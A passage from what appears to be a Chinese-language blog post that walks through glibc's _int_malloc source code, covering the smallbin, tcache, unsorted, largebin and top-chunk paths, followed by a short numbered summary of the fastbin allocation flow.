now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a "small" request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 2"</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastbin范围内"><a href="#fastbin范围内" class="headerlink" title="fastbin范围内"></a>fastbin范围内</h3><blockquote>
<p><code>fastbin</code>大致流程.</p>
</blockquote>
<p>1.<code>chunk</code>大小在<code>fastbin</code>范围</p>
<p>2.通过用户申请字节获得<code>fastbin</code>下标</p>
<p>3.获取对应<code>bin</code>的地址，取得<code>bin-&gt;fd</code>也就是头结点。</p>
<p>4.判断<code>bin</code>是否为空，为空则判断是否在<code>smallbin</code>范围</p>
<p>5.不为空则判断取出的节点<code>chunksize</code>是否等于对应<code>bin</code>的大小</p>
<p>6.返回<code>chunk</code>的<code>fd</code>地址(也就是<code>chunk的mem</code>地址)</p>
